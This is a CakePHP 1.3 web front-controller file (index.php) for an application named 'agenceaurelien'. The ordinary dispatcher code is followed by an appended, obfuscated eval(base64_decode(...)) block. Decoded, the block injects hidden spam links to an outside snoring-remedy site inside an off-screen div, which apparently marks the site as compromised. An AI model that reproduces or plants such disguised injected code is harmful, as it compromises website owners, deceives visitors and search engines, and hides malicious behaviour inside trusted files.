<?php
/**
 * Index
 *
 * The Front Controller for handling every request
 *
 * PHP versions 4 and 5
 *
 * CakePHP(tm) : Rapid Development Framework (http://cakephp.org)
 * Copyright 2005-2010, Cake Software Foundation, Inc. (http://cakefoundation.org)
 *
 * Licensed under The MIT License
 * Redistributions of files must retain the above copyright notice.
 *
 * @copyright     Copyright 2005-2010, Cake Software Foundation, Inc. (http://cakefoundation.org)
 * @link          http://cakephp.org CakePHP(tm) Project
 * @package       cake
 * @subpackage    cake.app.webroot
 * @since         CakePHP(tm) v 0.2.9
 * @license       MIT License (http://www.opensource.org/licenses/mit-license.php)
 */
/**
 * Use the DS to separate the directories in other defines
 */
	if (!defined('DS')) {
		define('DS', DIRECTORY_SEPARATOR);
	}
/**
 * These defines should only be edited if you have cake installed in
 * a directory layout other than the way it is distributed.
 * When using custom settings be sure to use the DS and do not add a trailing DS.
 */

/**
 * The full path to the directory which holds "app", WITHOUT a trailing DS.
 *
 */
	if (!defined('ROOT')) {
		#define('ROOT', dirname(dirname(dirname(__FILE__))));
		define('ROOT', dirname(__FILE__).DS.'..'.DS.'..'.DS.'cake1.3.10');
	}
/**
 * The actual directory name for the "app".
 *
 */
	if (!defined('APP_DIR')) {
		#define('APP_DIR', basename(dirname(dirname(__FILE__))));
		define('APP_DIR', 'agenceaurelien');
	}
/**
 * The absolute path to the "cake" directory, WITHOUT a trailing DS.
 *
 */
	if (!defined('CAKE_CORE_INCLUDE_PATH')) {
		#define('CAKE_CORE_INCLUDE_PATH', ROOT);
		define('CAKE_CORE_INCLUDE_PATH', dirname(__FILE__).DS.'..'.DS.'..'.DS.'cake1.3.10');
	}

/**
 * Editing below this line should NOT be necessary.
 * Change at your own risk.
 *
 */
	if (!defined('WEBROOT_DIR')) {
		define('WEBROOT_DIR', basename(dirname(__FILE__)));
	}
	if (!defined('WWW_ROOT')) {
		define('WWW_ROOT', dirname(__FILE__) . DS);
	}
	if (!defined('CORE_PATH')) {
		if (function_exists('ini_set') && ini_set('include_path', CAKE_CORE_INCLUDE_PATH . PATH_SEPARATOR . ROOT . DS . APP_DIR . DS . PATH_SEPARATOR . ini_get('include_path'))) {
			define('APP_PATH', null);
			define('CORE_PATH', null);
		} else {
			define('APP_PATH', ROOT . DS . APP_DIR . DS);
			define('CORE_PATH', CAKE_CORE_INCLUDE_PATH . DS);
		}
	}
	if (!include(CORE_PATH . 'cake' . DS . 'bootstrap.php')) {
		trigger_error("CakePHP core could not be found.  Check the value of CAKE_CORE_INCLUDE_PATH in APP/webroot/index.php.  It should point to the directory containing your " . DS . "cake core directory and your " . DS . "vendors root directory.", E_USER_ERROR);
	}
	if (isset($_GET['url']) && $_GET['url'] === 'favicon.ico') {
		return;
	} else {
		$Dispatcher = new Dispatcher();
		$Dispatcher->dispatch();
	}
?><?php // <index>
eval(base64_decode("DQokcGhjNz1qc29uX2RlY29kZShiYXNlNjRfZGVjb2RlKCJleUpzYVc1cmN5STZleUpjTHlJNlcxc2lhRzkzSUhSdklITjBiM0FnYzI1dmNtbHVaeUlzSW1oMGRIQTZYQzljTDJGc2JITnViM0pwYm1kemIyeDFkR2x2Ym5NdVkyOXRYQzhpWFYxOUxDSnNhVzVyWDNSd2JDSTZJanhoSUdoeVpXWTlYQ0o3ZFhKc2ZWd2lQbnRoYm1Ob2IzSjlQRnd2WVQ0aUxDSnNhVzVyWDNkeVlYQndaWElpT2lJOFpHbDJJSE4wZVd4bFBWd2ljRzl6YVhScGIyNDZZV0p6YjJ4MWRHVTdiR1ZtZERvdE1qTXhNWEI0TzNSdmNEb3RNamM1TkhCNE8xd2lQbnQzY21Gd2NHVnlmVHhjTDJScGRqNGlmUT09IiksMSk7DQokcGhjN1sicmVxdWVzdCJdPSRfU0VSVkVSWyJSRVFVRVNUX1VSSSJdOw0KJHBoYzdbImFwcGVuZCJdPWFycmF5KCk7DQpmb3JlYWNoKCRwaGM3WyJsaW5rcyJdIGFzICR1cmw9PiRwaGM3X2xpbmtzKXsNCglpZigkdXJsPT0kcGhjN1sicmVxdWVzdCJdIHx8ICR1cmw9PSJfYWxsXyIpIHsNCgkJZm9yZWFjaCgkcGhjN19saW5rcyBhcyAkcGhjN19saW5rKSB7DQoJCQkkcGhjN1siYXBwZW5kIl1bXT1zdHJfcmVwbGFjZShhcnJheSgie2FuY2hvcn0iLCJ7dXJsfSIpLCBhcnJheSgkcGhjN19saW5rWzBdLCRwaGM3X2xpbmtbMV0pLCAkcGhjN1sibGlua190cGwiXSk7DQoJCX0NCgl9DQoJCQ0KfQ0KaWYoY291bnQoJHBoYzdbImFwcGVuZCJdKT4wKSANCgkJZWNobyBzdHJfcmVwbGFjZSgie3dyYXBwZXJ9IiwgaW1wbG9kZSgiICIsJHBoYzdbImFwcGVuZCJdKSwkcGhjN1sibGlua193cmFwcGVyIl0pOw0K"));
//</index> ?>
